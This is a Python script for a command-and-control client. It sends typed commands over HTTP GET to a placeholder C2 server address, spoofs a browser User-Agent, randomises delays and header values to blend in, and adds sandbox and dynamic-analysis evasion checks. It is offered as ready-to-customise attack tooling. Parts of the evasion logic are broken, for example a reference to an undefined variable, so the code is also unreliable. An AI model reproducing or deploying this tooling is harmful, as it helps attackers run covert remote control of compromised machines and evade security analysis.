import requests
import random
import time
import gzip
import io

# List of known sandbox artifacts (customize this list)
sandbox_artifacts = ["sandbox_file.exe", "sandbox_reg_key"]

def send_get_request(command):
    # Introduce a randomized delay before sending GET requests
    randomized_delay()

    # Check for known sandbox artifacts before sending the request
    if check_sandbox_artifacts(command):
        print("Known sandbox artifacts detected. Delaying execution...")
        time.sleep(random.randint(5, 10))  # Delay execution for 5 to 10 seconds
        return "Sandbox artifacts detected. Execution delayed."

    # Check for dynamic analysis indicators before sending the request
    if check_dynamic_analysis():
        print("Dynamic analysis detected. Delaying execution...")
        time.sleep(random.randint(5, 10))  # Delay execution for 5 to 10 seconds
        return "Dynamic analysis detected. Execution delayed."

    # Send an HTTP GET request to the C2 server on port 80 with custom headers and variable content length
    server_url = "http://c2_server_ip"  # Replace with your server's IP
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36',
        'X-Custom-Header': 'MyCustomValue',  # Add your custom header here
        'Content-Length': str(random.randint(50, 500))  # Random content length
    }
    response = requests.get(f"{server_url}/{command}", headers=headers)
    return decompress_response(response.content)

def check_sandbox_artifacts(command):
    # Check for known sandbox artifacts in the received command
    for artifact in sandbox_artifacts:
        if artifact in command:
            return True
    return False

def check_dynamic_analysis():
    # Check for indicators of dynamic analysis (customize this check)
    # For example, you can look for the presence of debuggers, virtualized environments, or monitoring tools
    if "debugger" in headers.get('User-Agent', '').lower():
        return True
    return False

def randomized_delay():
    # Introduce a random delay before sending a request (customize this delay)
    time.sleep(random.uniform(1, 5))

def decompress_response(response):
    # Decompress the response using gzip
    with gzip.GzipFile(fileobj=io.BytesIO(response), mode='rb') as f:
        decompressed_data = f.read()
    return decompressed_data.decode('utf-8')

if __name__ == "__main__":
    while True:
        command = input("Enter command: ")
        if command.lower() == "exit":
            break
        result = send_get_request(command)
        print(f"Response: {result}")
